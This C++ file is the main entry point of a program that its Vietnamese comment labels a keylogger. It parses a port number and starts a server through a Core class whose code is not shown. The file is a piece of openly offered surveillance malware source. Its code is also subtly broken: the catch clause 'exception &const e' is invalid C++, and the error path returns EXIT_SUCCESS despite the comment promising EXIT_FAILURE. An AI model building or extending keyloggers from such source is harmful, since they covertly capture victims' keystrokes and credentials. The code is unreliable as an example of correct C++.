
// Hàm main của Key logger

#include <iostream>
#include "Core.hpp"
using namespace std;

/*
+ Nó kiểm tra số lượng đối số dòng lệnh được truyền vào.
Nếu không đúng định dạng, nó in ra một thông báo lỗi và trả về EXIT_FAILURE.
+ Nếu định dạng đúng, nó tạo một đối tượng Core và bắt đầu chạy máy chủ thông
qua phương thức start. Nó chuyển đối số cổng từ dòng lệnh thành số nguyên và
truyền cho phương thức start.
+ Nếu có bất kỳ ngoại lệ nào xảy ra trong quá trình khởi tạo hoặc chạy máy chủ,
nó in ra thông báo lỗi và trả về EXIT_FAILURE.
+ Nếu mọi thứ diễn ra một cách thành công, nó trả về EXIT_SUCCESS,
chỉ ra rằng chương trình đã hoàn thành mà không gặp vấn đề gì.
*/
int main(int ac, char **av)
{
    if (ac != 2)
    {
        cerr << "Usage : ./server [port]" << endl;
        return (EXIT_FAILURE);
    }
    try
    {
        Core core;
        cout << "server >> " << flush;
        core.start(stoi(av[1]));
    }
    catch (exception &const e)
    {
        cerr << e.what() << endl;
        return (EXIT_SUCCESS);
    }

    return (EXIT_SUCCESS);
}
